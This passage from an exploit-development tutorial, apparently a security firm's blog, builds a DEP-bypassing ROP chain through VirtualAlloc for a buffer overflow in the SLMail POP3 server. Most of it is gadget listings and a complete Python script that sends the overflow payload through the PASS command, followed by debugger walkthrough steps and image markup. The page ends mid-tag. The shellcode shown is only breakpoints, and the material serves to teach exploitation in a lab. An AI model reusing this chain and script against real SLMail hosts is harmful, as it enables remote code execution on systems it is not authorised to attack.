<p>The first gadget is trying to store a value in the address EAX points to (ADD DWORD PTR DS:[EAX],EAX), so we need to make sure there is a valid pointer in EAX. We can do this by adding this gadget at the top of the chain:</p>



<pre class="wp-block-code"><code># Put a valid pointer on EAX
0x5f48c086,         # MOV EAX,ECX # RETN</code></pre>



<p>We get the pointer to VirtualAlloc:</p>



<pre class="wp-block-code"><code># Ptr to VirtualAlloc on EAX
0x5f418fac,           # POP EAX # RETN
0x5f49a1cc,          # PTR to kernel32.dll (this address goes to EAX for the gadget before)
0x5f488461,         # MOV EAX,DWORD PTR DS:&#91;EAX] # RETN 0x04
0x5f4011f2,          # RET (This is a ROP NOP, just goes to the next value on the stack)
0x41414141,        # Compensate for the Retn 0x04
0x5f445803,         # POP EDI # RETN
0xffffff28,              # Offset to VirtualAlloc -0xd8 (we use a negative offset to avoid null bytes)
0x5f46e759,         # ADD EAX,EDI # TEST AL,49 # POP EDI # RETN (We have the pointer on EAX)
0x41414141,        # Filler to POP EDI
# Save the pointer to VirtualAlloc
0x5f440377,         # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
0x5f4011f2,          # RET
0x41414141,        # Compensate for the Retn 0x08
0x41414141,        # Compensate for the Retn 0x08</code></pre>



<p>At the address pointed to by ECX we have a pointer to VirtualAlloc; now we need to put the return address in place. This address is where VirtualAlloc will return, and will usually be behind the rop chain. As we don’t know yet how many bytes in length the rop chain is, this value will be fixed later. At the moment, let’s just give 320 bytes (0x140) for the chain.</p>



<pre class="wp-block-code"><code># returnTo (Address where VirtualAlloc returns: must be behind the rop_chain)
0x5f418fac,           # POP EAX # RETN
0xFFFFFEC0,        # Value to EAX (-0x140, we use a negative value to avoid null bytes)
0x5f465969,         # NEG EAX # RETN
0x5f425151,         # PUSH ECX # INC EDX # POP EDI # RETN (move ecx -&gt; edi)
0x5f46e759,         # ADD EAX,EDI # TEST AL,49 # POP EDI # RETN (On EAX we have the address)
0x41414141,        # Filler to POP EDI
0x5f4298a4,         # INC ECX # RETN (we need to add 4 to ECX to store the value on stack)
0x5f4298a4,         # INC ECX # RETN
0x5f4298a4,         # INC ECX # RETN
0x5f4298a4,         # INC ECX # RETN
# Save returnTo
0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
0x5f4011f2,          # RET
0x41414141,        # Compensate for the Retn 0x08
0x41414141,        # Compensate for the Retn 0x08</code></pre>



<p>Next, the address where the allocation of memory starts. In exploits with enough space behind the rop chain the same value as returnTo can be used, but in this case we need to find another place to fit the shellcode.</p>



<p>From finsmsp.txt, we know that we can put the shellcode before the value that overwrites the saved EIP:</p>



<pre class="wp-block-code"><code># findmsp.txt
0x01ce8fb8 : Contains normal cyclic pattern at ESP-0x1170 (-4464) : offset 4092, length 996 (-&gt; 0x01ce939b : ESP-0xd8c)</code></pre>



<p>So at offset 4092 we have 562 bytes to use before overwriting the saved EIP (offset 4654). What we are going to try is to put the shellcode before EIP, then the rop chain after, and just behind the rop chain a jump backwards to the shellcode. So for lpAddress we need to calculate the bytes to remove from the stack to set it at the address where the jump will land. At first, let’s remove 400bytes (0x190) and later we will adjust the value.</p>



<pre class="wp-block-code"><code># lpAddress (Address where start the execute flag)
0x5f418fac,           # POP EAX # RETN
0xFFFFFE70,        # Value to EAX (-0x190)
0x5f425151,         # PUSH ECX # INC EDX # POP EDI # RETN
0x5f46e759,         # ADD EAX,EDI # TEST AL,49 # POP EDI # RETN
0x41414141,        # Filler to POP EDI
0x5f4298a4,         # INC ECX # RETN
0x5f4298a4,         # INC ECX # RETN
0x5f4298a4,         # INC ECX # RETN
0x5f4298a4,         # INC ECX # RETN
0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
0x5f4298a4,         # INC ECX # RETN
0x41414141,        # Compensate for the Retn 0x08
0x41414141,        # Compensate for the Retn 0x08</code></pre>



<p>The next value is dwSize, the size of the memory where we want to disable DEP. Here we know that the allocated space will start 400 bytes away (0x190), so we need a value which when added to lpAddress reaches the memory where the jump backwards instruction would be. For this value we are going to use 0x1FF:</p>



<pre class="wp-block-code"><code># dwSize (0x1FF)
0x5f418fac,           # POP EAX # RETN
0xFFFFFE01,        # Value to EAX (-0x1FF)
0x5f465969,         # NEG EAX # RETN
0x5f4298a4,         # INC ECX # RETN
0x5f4298a4,         # INC ECX # RETN
0x5f4298a4,         # INC ECX # RETN
0x5f440377,         # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
0x5f4298a4,         # INC ECX # RETN
0x41414141,        # Compensate for the Retn 0x08
0x41414141,        # Compensate for the Retn 0x08</code></pre>



<p>Next we put flAllocationType at 0x1000 (MEM_COMMIT):</p>



<pre class="wp-block-code"><code># flAllocationType (0x1000)
0x5f418fac,           # POP EAX # RETN
0xFFFFF001,        # -0xFFF  (-0x1000 contains null bytes)
0x5f465969,         # NEG EAX # RETN
0x5f4235b6,         # INC EAX # RETN (0xFFF + 1 = 0x1000)
0x5f4298a4,         # INC ECX # RETN
0x5f4298a4,         # INC ECX # RETN
0x5f4298a4,         # INC ECX # RETN
0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
0x5f4298a4,         # INC ECX # RETN
0x41414141,        # Compensate for the Retn 0x08
0x41414141,        # Compensate for the Retn 0x08</code></pre>



<p>For the flProtect field we use 0x40 (PAGE_EXECUTE_READWRITE):</p>



<pre class="wp-block-code"><code># flProtect (0x40)
0x5f418fac,           # POP EAX # RETN
0xFFFFFFC0,        # -0x40 
0x5f465969,         # NEG EAX # RETN
0x5f4298a4,         # INC ECX # RETN
0x5f4298a4,         # INC ECX # RETN
0x5f4298a4,         # INC ECX # RETN
0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
0x5f4011f2,          # RET
0x41414141,        # Compensate for the Retn 0x08
0x41414141,        # Compensate for the Retn 0x08
</code></pre>



<p>Once the stack is set up, we need to make sure ESP is pointing to the VirtualAlloc pointer we put in the stack (the pointer is at ECX &#8211; 20bytes (0x14)):</p>



<pre class="wp-block-code"><code># Make ESP point to VirtualAlloc pointer on stack and RET
0x5f418fac,           # POP EAX # RETN
0xFFFFFFEC,        # -0x14 (value to substract to ECX)
0x5f425151,         # PUSH ECX # INC EDX # POP EDI # RETN (move ecx to edi)
0x5f46e759,         # ADD EAX,EDI # TEST AL,49 # POP EDI # RETN (On eax is the pointer to VirtualAlloc)
0x41414141,        # Filler to POP EDI
0x5f452c0f,          # XCHG EAX,ESP # RETN (put the pointer on ESP)</code></pre>



<p>The RETN instruction in the last gadget of the chain will launch the VirtualAlloc function, which will land after its execution somewhere on the buffer behind the chain (if we add enough space when calculating the return address)</p>



<p>Let’s put all this together to see if it’s working. Here is the first version of the current exploit:</p>



<pre class="wp-block-code"><code>import sys
import socket
import struct

def create_rop_chain():
                rop_gadgets = &#91;
                  # Put a valid pointer on EAX
                  0x5f48c086,       # MOV EAX,ECX # RETN
                  #--- Save ESP into ECX
                  0x5f42F7dc,       # PUSH ESP # INC ESI # ADD DWORD PTR DS:&#91;EAX],EAX # POP ECX # MOV EAX,ESI # POP ESI # RETN 0x04
                  0x41414141,      # to pop esi
                  0x5f4011f2,        # RET
                  0x41414141,      # compensate retn 0x04
                  # Ptr to VirtualAlloc on EAX
                  0x5f418fac,         # POP EAX # RETN
                  0x5f49a1cc,        # PTR to kernel32.dll
                  0x5f488461,       # MOV EAX,DWORD PTR DS:&#91;EAX] # RETN 0x04
                  0x5f4011f2,        # RET
                  0x41414141,      # Compensate for the Retn 0x04
                  0x5f445803,       # POP EDI # RETN
                  0xffffff28,            # Offset to VirtualAlloc -0xd8
                  0x5f46e759,       # ADD EAX,EDI # TEST AL,49 # POP EDI # RETN
                  0x41414141,      # Filler to POP EDI
                  # Save the pointer to VirtualAlloc
                  0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
                  0x5f4011f2,        # RET
                  0x41414141,      # Compensate for the Retn 0x08
                  0x41414141,      # Compensate for the Retn 0x08
                  # returnTo (Address where VirtualAlloc returns: must be behind the rop_chain)
                  0x5f418fac,         # POP EAX # RETN
                  0xFFFFFEC0,      # Value to EAX (-0x140)
                  0x5f465969,       # NEG EAX # RETN
                  0x5f425151,       # PUSH ECX # INC EDX # POP EDI # RETN
                  0x5f46e759,       # ADD EAX,EDI # TEST AL,49 # POP EDI # RETN
                  0x41414141,      # Filler to POP EDI
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  # Save returnTo
                  0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
                  0x5f4011f2,        # RET
                  0x41414141,      # Compensate for the Retn 0x08
                  0x41414141,      # Compensate for the Retn 0x08
                  # lpAddress (Address where start the execute flag)
                  0x5f418fac,         # POP EAX # RETN
                  0xFFFFFE70,      # Value to EAX (-400 bytes (0x190))
                  0x5f425151,       # PUSH ECX # INC EDX # POP EDI # RETN
                  0x5f46e759,       # ADD EAX,EDI # TEST AL,49 # POP EDI # RETN
                  0x41414141,      # Filler to POP EDI
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
                  0x5f4298a4,       # INC ECX # RETN
                  0x41414141,      # Compensate for the Retn 0x08
                  0x41414141,      # Compensate for the Retn 0x08
                  # dwSize (0x1FF)
                  0x5f418fac,         # POP EAX # RETN
                  0xFFFFFE01,      # Value to EAX (-0x1FF)
                  0x5f465969,       # NEG EAX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
                  0x5f4298a4,       # INC ECX # RETN
                  0x41414141,      # Compensate for the Retn 0x08
                  0x41414141,      # Compensate for the Retn 0x08
                  # flAllocationType (0x1000)
                  0x5f418fac,         # POP EAX # RETN
                  0xFFFFF001,      # -0xFFF  (-0x1000 contains null bytes)
                  0x5f465969,       # NEG EAX # RETN
                  0x5f4235b6,       # INC EAX # RETN (0xFFF + 1 = 0x1000)
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
                  0x5f4298a4,       # INC ECX # RETN
                  0x41414141,      # Compensate for the Retn 0x08
                  0x41414141,      # Compensate for the Retn 0x08
                  # flProtect (0x40)
                  0x5f418fac,         # POP EAX # RETN
                  0xFFFFFFC0,      # -0x40 
                  0x5f465969,       # NEG EAX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
                  0x5f4011f2,        # RET
                  0x41414141,      # Compensate for the Retn 0x08
                  0x41414141,      # Compensate for the Retn 0x08
                  # Make ESP point to VirtualAlloc pointer on stack and RET
                  0x5f418fac,         # POP EAX # RETN
                  0xFFFFFFEC,      # -0x14 (value to substract to ECX)
                  0x5f425151,       # PUSH ECX # INC EDX # POP EDI # RETN (move ecx to edi)
                  0x5f46e759,       # ADD EAX,EDI # TEST AL,49 # POP EDI # RETN (eax -&gt; ptr VirtualAlloc)
                  0x41414141,      # Filler to POP EDI
                  0x5f452c0f,        # XCHG EAX,ESP # RETN
                ]
                return ''.join(struct.pack('&lt;I', _) for _ in rop_gadgets)

 
#0x5f4011f2 : # RET                          &#91;SLMFC.DLL]
EIP=struct.pack(&lt;I,0x5f4011f2)
move_esp = \x81\xc4\xc0\xfb\xff\xff # add esp,-440h

shellcode = \xcc\xcc\xcc\xcc
nop_chain = \x90 * 20

eip_offset = 4654
shellcode_offset = 4092
shellcode_size = 562
buff_size = 6000

rop_chain = create_rop_chain()

buffer = 'A' * shellcode_offset
buffer += 'B' * (eip_offset - len(buffer)) # Here is where the real shellcode goes
buffer += EIP
buffer += rop_chain
buffer += nop_chain
buffer += shellcode
buffer += 'C' * (buff_size - len(buffer))

print rop_chain length: +str(len(rop_chain))

HOST = '127.0.0.1'
PORT = 110

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
data = s.recv(1024)
print 'Received', repr(data)
s.send('USER username'+'\r\n')
data = s.recv(1024)
print 'Received', repr(data)
s.send('PASS ' + buffer + '\r\n')
s.close()
</code></pre>



<p>In this version we use a chain of NOP instructions behind the rop chain because we don’t know the exact address to which VirtualAlloc is going to return. After the NOPs, we put just INT 3 instructions as shellcode, to create a breakpoint where the debugger will stop.</p>



<p>If the rop chain works as expected, then the NOP instructions will execute as well as the breakpoint. If not, the NOP instruction would generate an access violation error.</p>



<p>Attach the SLMAIL process to Immunity Debugger (started as administrator) and put a breakpoint on the last gadget of the rop chain:</p>



<pre class="wp-block-code"><code>B 0x5f452c0f</code></pre>



<p>Then run the exploit, and if all goes well, the breakpoint should be reached:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="7762" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/26/" data-orig-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/26.png?fit=1120%2C597&amp;ssl=1" data-orig-size="1120,597" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="26" data-image-description data-medium-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/26.png?fit=300%2C160&amp;ssl=1" data-large-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/26.png?fit=1024%2C546&amp;ssl=1" loading="lazy" width="1024" height="546" src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/26.png?resize=1024%2C546&#038;ssl=1" alt class="wp-image-7762 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/26.png?resize=1024%2C546&amp;ssl=1 1024w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/26.png?resize=300%2C160&amp;ssl=1 300w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/26.png?resize=768%2C409&amp;ssl=1 768w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/26.png?resize=1100%2C586&amp;ssl=1 1100w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/26.png?w=1120&amp;ssl=1 1120w" data-lazy-sizes="(max-width: 1024px) 100vw, 1024px" data-lazy-src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/26.png?resize=1024%2C546&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7762" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/26/" data-orig-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/26.png?fit=1120%2C597&amp;ssl=1" data-orig-size="1120,597" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="26" data-image-description="" data-medium-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/26.png?fit=300%2C160&amp;ssl=1" data-large-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/26.png?fit=1024%2C546&amp;ssl=1" loading="lazy" width="1024" height="546" src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/26.png?resize=1024%2C546&#038;ssl=1" alt="" class="wp-image-7762" srcset="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/26.png?resize=1024%2C546&amp;ssl=1 1024w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/26.png?resize=300%2C160&amp;ssl=1 300w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/26.png?resize=768%2C409&amp;ssl=1 768w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/26.png?resize=1100%2C586&amp;ssl=1 1100w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/26.png?w=1120&amp;ssl=1 1120w" sizes="(max-width: 1024px) 100vw, 1024px" data-recalc-dims="1" /></noscript></figure>



<p>Once the breakpoint is reached, we go step-by-step, pressing F7 in Immunity Debugger until the call to VirtualAlloc (16 steps):</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img data-attachment-id="7763" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/27/" data-orig-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/27.png?fit=365%2C162&amp;ssl=1" data-orig-size="365,162" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="27" data-image-description data-medium-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/27.png?fit=300%2C133&amp;ssl=1" data-large-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/27.png?fit=365%2C162&amp;ssl=1" loading="lazy" width="365" height="162" src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/27.png?resize=365%2C162&#038;ssl=1" alt class="wp-image-7763 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/27.png?w=365&amp;ssl=1 365w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/27.png?resize=300%2C133&amp;ssl=1 300w" data-lazy-sizes="(max-width: 365px) 100vw, 365px" data-lazy-src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/27.png?resize=365%2C162&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7763" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/27/" data-orig-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/27.png?fit=365%2C162&amp;ssl=1" data-orig-size="365,162" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="27" data-image-description="" data-medium-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/27.png?fit=300%2C133&amp;ssl=1" data-large-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/27.png?fit=365%2C162&amp;ssl=1" loading="lazy" width="365" height="162" src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/27.png?resize=365%2C162&#038;ssl=1" alt="" class="wp-image-7763" srcset="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/27.png?w=365&amp;ssl=1 365w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/27.png?resize=300%2C133&amp;ssl=1 300w" sizes="(max-width: 365px) 100vw, 365px" data-recalc-dims="1" /></noscript></figure></div>



<p>Here is the stack at this point of execution:</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img data-attachment-id="7764" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/28/" data-orig-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/28.png?fit=417%2C158&amp;ssl=1" data-orig-size="417,158" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="28" data-image-description data-medium-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/28.png?fit=300%2C114&amp;ssl=1" data-large-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/28.png?fit=417%2C158&amp;ssl=1" loading="lazy" width="417" height="158" src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/28.png?resize=417%2C158&#038;ssl=1" alt class="wp-image-7764 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/28.png?w=417&amp;ssl=1 417w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/28.png?resize=300%2C114&amp;ssl=1 300w" data-lazy-sizes="(max-width: 417px) 100vw, 417px" data-lazy-src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/28.png?resize=417%2C158&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7764" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/28/" data-orig-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/28.png?fit=417%2C158&amp;ssl=1" data-orig-size="417,158" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="28" data-image-description="" data-medium-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/28.png?fit=300%2C114&amp;ssl=1" data-large-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/28.png?fit=417%2C158&amp;ssl=1" loading="lazy" width="417" height="158" src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/28.png?resize=417%2C158&#038;ssl=1" alt="" class="wp-image-7764" srcset="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/28.png?w=417&amp;ssl=1 417w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/28.png?resize=300%2C114&amp;ssl=1 300w" sizes="(max-width: 417px) 100vw, 417px" data-recalc-dims="1" /></noscript></figure></div>



<p>Now we pass the VirtualAlloc function, pressing f8 to avoid going through the function step by step. Then we press F7 two more times and we should reach the NOPs we put before the shellcode:</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img data-attachment-id="7765" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/29/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/29.png?fit=395%2C357&amp;ssl=1" data-orig-size="395,357" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="29" data-image-description data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/29.png?fit=300%2C271&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/29.png?fit=395%2C357&amp;ssl=1" loading="lazy" width="395" height="357" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/29.png?resize=395%2C357&#038;ssl=1" alt class="wp-image-7765 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/29.png?w=395&amp;ssl=1 395w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/29.png?resize=300%2C271&amp;ssl=1 300w" data-lazy-sizes="(max-width: 395px) 100vw, 395px" data-lazy-src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/29.png?resize=395%2C357&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7765" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/29/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/29.png?fit=395%2C357&amp;ssl=1" data-orig-size="395,357" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="29" data-image-description="" data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/29.png?fit=300%2C271&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/29.png?fit=395%2C357&amp;ssl=1" loading="lazy" width="395" height="357" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/29.png?resize=395%2C357&#038;ssl=1" alt="" class="wp-image-7765" srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/29.png?w=395&amp;ssl=1 395w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/29.png?resize=300%2C271&amp;ssl=1 300w" sizes="(max-width: 395px) 100vw, 395px" data-recalc-dims="1" /></noscript></figure></div>



<p>As we can see, we reach the first NOP instruction (that was lucky…). Now to know if DEP is disabled just press F7 again. If all works well, the NOP instruction executes, and if not we will receive an access violation error.</p>



<p>Now that we know we can execute code on the stack, let’s try to find the place where the shellcode is, to calculate the distance of the backwards jump we need to make.</p>



<p>To achieve this, on Immunity we just double-click the memory address of the NOP to which VirtualAlloc returned. The view changes, and instead of memory addresses we start seeing offsets from the address we selected with the double click.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img data-attachment-id="7766" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/30/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/30.png?fit=508%2C272&amp;ssl=1" data-orig-size="508,272" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="30" data-image-description data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/30.png?fit=300%2C161&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/30.png?fit=508%2C272&amp;ssl=1" loading="lazy" 